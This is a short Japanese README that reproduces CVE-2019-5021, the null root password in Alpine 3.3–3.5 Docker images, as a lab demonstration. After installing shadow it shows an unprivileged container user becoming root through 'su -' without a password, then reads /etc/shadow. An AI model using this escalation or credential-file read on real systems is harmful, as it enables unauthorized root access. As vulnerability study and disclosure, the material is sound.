# cve-2019-5021
alpineイメージ (v3.3 - v3.5) のrootパスワードがnullだった脆弱性。
デフォルトの`/bin/su`はbusyboxへのシンボリックリンクでsuidされていない。`shadow`パッケージをインストールすると`/bin/su`もsuidされるため、以下のようにこの脆弱性の影響を確認することができる。

まず`Dockerfile`からイメージをbuildする。
```
$ docker build -t cve-2019-5021:1 .
Sending build context to Docker daemon  3.072kB
Step 1/2 : FROM alpine:3.5
 ---> f80194ae2e0c
Step 2/2 : RUN apk update && apk add shadow
 ---> Running in 0bd5a51ac649
fetch http://dl-cdn.alpinelinux.org/alpine/v3.5/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.5/community/x86_64/APKINDEX.tar.gz
v3.5.3-40-g389d0b359a [http://dl-cdn.alpinelinux.org/alpine/v3.5/main]
v3.5.3-40-g389d0b359a [http://dl-cdn.alpinelinux.org/alpine/v3.5/community]
OK: 7963 distinct packages available
(1/2) Installing linux-pam (1.2.1-r0)
(2/2) Installing shadow (4.2.1-r8)
Executing busybox-1.25.1-r2.trigger
OK: 6 MiB in 13 packages
Removing intermediate container 0bd5a51ac649
 ---> b2ac47c6d945
Successfully built b2ac47c6d945
Successfully tagged cve-2019-5021:1
```

uid:65534(nobody)を指定してbuildしたイメージからコンテナを起動する。
`su -`コマンドでrootのパスワードを聞かれずにrootになれる。
```
$ docker container run --user 65534:65534 -it cve-2019-5021:1
~ $ id
uid=65534(nobody) gid=65534(nobody)
~ $ su -
c40b869c5be7:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
c40b869c5be7:~# 
```

`/etc/shadow`を見てみると確かにrootのパスワードが設定されていない。
```
c40b869c5be7:~# grep root /etc/shadow
root:::0:::::

```
